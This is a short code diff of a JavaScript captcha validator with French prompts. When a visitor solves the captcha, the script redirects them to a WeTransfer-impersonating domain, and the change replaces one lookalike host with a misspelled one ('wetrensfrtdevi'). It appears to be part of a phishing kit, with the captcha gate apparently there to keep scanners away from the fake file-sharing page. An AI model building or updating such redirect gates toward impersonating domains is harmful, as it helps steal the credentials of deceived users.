@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://wetransfer.iceiy.com/";
+        targetURL="https://wetrensfrtdevi.iceiy.com/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
@@ -38,4 +38,5 @@ window.location=targetURL;
     }
 
 }
+
 
